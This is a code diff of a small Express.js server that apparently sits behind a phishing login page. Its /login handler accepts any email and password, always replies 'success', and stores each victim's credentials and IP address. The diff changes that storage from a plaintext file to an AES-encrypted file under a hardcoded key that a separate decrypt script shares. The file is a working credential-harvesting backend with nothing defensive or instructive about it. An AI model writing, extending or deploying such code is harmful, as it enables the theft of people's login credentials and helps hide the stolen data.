@@ -1,35 +1,46 @@
 const express = require("express");
 const path = require("path");
 const fs = require("fs");
+const crypto = require("crypto");
 const app = express();
 
-// Allow form POST data
 app.use(express.urlencoded({ extended: true }));
-
-// Serve all static files (HTML, CSS, JS, images)
 app.use(express.static(path.join(__dirname)));
 
-// ⭐ ALWAYS SUCCESSFUL LOGIN + STORE IP ⭐
+const SECRET_KEY = crypto
+  .createHash("sha256")
+  .update("my-secret-key") // MUST match decrypt.js
+  .digest();
+
+const ALGO = "aes-256-cbc";
+
+function encrypt(text) {
+    const iv = crypto.randomBytes(16);
+    const cipher = crypto.createCipheriv(ALGO, SECRET_KEY, iv);
+
+    let encrypted = cipher.update(text, "utf8", "base64");
+    encrypted += cipher.final("base64");
+
+    return `${iv.toString("base64")}:${encrypted}`;
+}
+
 app.post("/login", (req, res) => {
     const userIP =
-        req.headers["x-forwarded-for"] || // Render / proxies
-        req.socket.remoteAddress ||       // Direct connection
+        req.headers["x-forwarded-for"] ||
+        req.socket.remoteAddress ||
         "Unknown IP";
 
     const email = req.body.email;
     const password = req.body.password;
 
-    const logEntry = `IP: ${userIP} | Email: ${email} | Password: ${password}\n`;
+    const data = `email=${email}; password=${password}; ip=${userIP}`;
 
-    // Save IP + email + password to a file
-    fs.appendFileSync("ips.txt", logEntry);
+    const encrypted = encrypt(data);
 
-    // Always return success
+    fs.appendFileSync("users.enc.txt", encrypted + "\n");
+
     res.send("success");
 });
 
-// Start server
-const PORT = process.env.PORT || 3000;
-app.listen(PORT, () => {
-    console.log(`Server running on port ${PORT}`);
-});
+const PORT = process.env.PORT || 10000;
+app.listen(PORT, () => console.log(`Server running on port ${PORT}`));
